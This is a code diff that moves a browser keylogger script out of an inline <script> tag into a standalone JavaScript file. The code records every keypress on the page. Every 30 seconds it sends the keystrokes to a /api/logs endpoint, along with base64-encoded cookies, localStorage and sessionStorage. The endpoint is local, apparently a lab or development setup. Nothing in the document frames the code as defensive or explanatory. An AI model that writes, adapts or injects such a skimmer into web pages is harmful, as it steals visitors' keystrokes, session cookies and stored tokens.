@@ -1,39 +1,37 @@
-<script>
-    let keys = [];
-    let pos = 0;
+let keys = [];
+let pos = 0;
 
-    const sendKeyStrokes = async (data) => {
-        const response = await fetch("http://127.0.0.1:5000/api/logs", {
-            method: "POST",
-            mode: "cors",
-            headers: {
-                "Content-Type": "appliction/json",
-            },
-            body: JSON.stringify({
-                "cookies": btoa(document.cookie),
-                "keystrokes": btoa(JSON.stringify(data)),
-                "localStorage": btoa(JSON.stringify(localStorage)),
-                "sessionStorage": btoa(JSON.stringify(sessionStorage)),
-            }),
-        });
-        return response.json();
+const sendKeyStrokes = async (data) => {
+    const response = await fetch("http://127.0.0.1:5000/api/logs", {
+        method: "POST",
+        mode: "cors",
+        headers: {
+            "Content-Type": "appliction/json",
+        },
+        body: JSON.stringify({
+            "cookies": btoa(document.cookie),
+            "keystrokes": btoa(JSON.stringify(data)),
+            "localStorage": btoa(JSON.stringify(localStorage)),
+            "sessionStorage": btoa(JSON.stringify(sessionStorage)),
+        }),
+    });
+    return response.json();
+}
+
+window.onload = () => {
+    document.body.onkeydown = (event) => {
+        const { key } = event;
+        keys.push(key);
     }
 
-    window.onload = () => {
-        document.body.onkeydown = (event) => {
-            const { key } = event;
-            keys.push(key);
+    setInterval(() => {
+        pos = keys.length;
+        if (keys.length) {
+            sendKeyStrokes(keys)
+                .then(() => {
+                    keys = keys.slice(pos);
+                    pos = 0;
+                });
         }
-
-        setInterval(() => {
-            pos = keys.length;
-            if (keys.length) {
-                sendKeyStrokes(keys)
-                    .then(() => {
-                        keys = keys.slice(pos);
-                        pos = 0;
-                    });
-            }
-        }, 30000);
-    }
-</script>
+    }, 30000);
+}
